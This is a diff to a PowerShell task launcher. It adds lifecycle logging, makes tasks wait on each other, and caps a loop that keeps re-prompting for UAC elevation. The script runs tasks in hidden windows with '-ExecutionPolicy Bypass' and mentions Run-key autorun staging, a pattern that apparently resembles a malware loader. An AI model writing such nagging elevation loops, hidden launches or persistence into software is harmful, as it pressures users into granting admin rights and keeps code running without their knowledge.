@@ -47,12 +47,23 @@ function Invoke-Script
     if ([string]::IsNullOrEmpty($taskDir)) { $taskDir = (Get-HephaestusFolder) }
     # $globalDebug: visibility only (window style). Elevation path is unchanged.
     $taskWinStyle = $(if ($globalDebug) { "Normal" } else { "Hidden" })
-    $taskArgList = "-ExecutionPolicy Bypass -File `"$scriptPath`" -Task $taskName"
-    if (IsElevated) {
-        Start-Process powershell.exe -WindowStyle $taskWinStyle -WorkingDirectory $taskDir -ArgumentList $taskArgList
+    [string]$taskOne = if ($null -eq $taskName) { '' } elseif ($taskName -is [System.Array]) { [string]$taskName[0] } else { [string]$taskName }
+    $taskArgs = @('-ExecutionPolicy', 'Bypass', '-File', $scriptPath, '-Task', $taskOne)
+    Write-TaskLifecycleLog -TaskName $taskOne -Phase START -Detail "file=$scriptPath"
+    $proc = $null
+    try {
+        # Wait so earlier tasks (e.g. autorun registry staging) finish before later ones (e.g. autoregistry HKCU Run).
+        if (IsElevated) {
+            $proc = Start-Process powershell.exe -WindowStyle $taskWinStyle -WorkingDirectory $taskDir -ArgumentList $taskArgs -PassThru -Wait
+        }
+        else {
+            $proc = Start-Process powershell.exe -WindowStyle $taskWinStyle -Verb RunAs -WorkingDirectory $taskDir -ArgumentList $taskArgs -PassThru -Wait
+        }
+        if ($null -ne $proc) { writedbg "Invoke-Script $taskOne exit=$($proc.ExitCode)" }
     }
-    else {
-        Start-Process powershell.exe -WindowStyle $taskWinStyle -Verb RunAs -WorkingDirectory $taskDir -ArgumentList $taskArgList
+    finally {
+        $xc = if ($null -ne $proc -and $proc.HasExited) { [string]$proc.ExitCode } else { 'n/a' }
+        Write-TaskLifecycleLog -TaskName $taskOne -Phase STOP -Detail "exit=$xc"
     }
 }
 
@@ -78,7 +89,7 @@ function Main
     writedbg "program curScript: $showPath"
 
     if ($global:Task) {
-        writedbg "Task - $task"
+        writedbg "Task - $global:Task"
         & $global:Task
     } else 
     {               
@@ -95,18 +106,29 @@ function Main
                     if ($delaySec -lt 0) { $delaySec = 0 }
                     $aggressiveElevRetry = [bool]$server.aggressiveAdmin
                     if ($aggressiveElevRetry) {
+                        # aggressiveAdminAttempts: 0 or less = retry UAC forever; N > 0 = stop after N failed attempts (then exit; re-run is safe).
+                        $maxUacTries = [int]$server.aggressiveAdminAttempts
+                        $unlimitedUac = ($maxUacTries -le 0)
                         $attempt = GetArgInt("attempt")
+                        $tryIdx = 0
                         while ($true) {
+                            $tryIdx++
                             $attempt++
                             if ($attempt -ne 1) {
-                                writedbg "Main: elevation not accepted; sleeping ${delaySec}s before next UAC (attempt $attempt)"
+                                $capMsg = if ($unlimitedUac) { "try=$tryIdx (unlimited)" } else { "try=$tryIdx of $maxUacTries" }
+                                writedbg "Main: elevation retry; sleeping ${delaySec}s before UAC ($capMsg, attempt arg=$attempt)"
                                 Start-Sleep -Seconds $delaySec
                             }
                             try {
                                 RunMe -script $selfPath -repassArgs $true -argName "-attempt" -argValue "$attempt" -uac $true -Wait $true
                                 return
-                            } catch {
-                                writedbg "Main: elevation cancelled or failed: $_"
+                            }
+                            catch {
+                                writedbg "Main: elevation attempt failed (try $tryIdx): $_"
+                            }
+                            if (-not $unlimitedUac -and $tryIdx -ge $maxUacTries) {
+                                writedbg "Main: UAC not completed after $maxUacTries tries; stopping (no task launch)."
+                                return
                             }
                         }
                     } else {
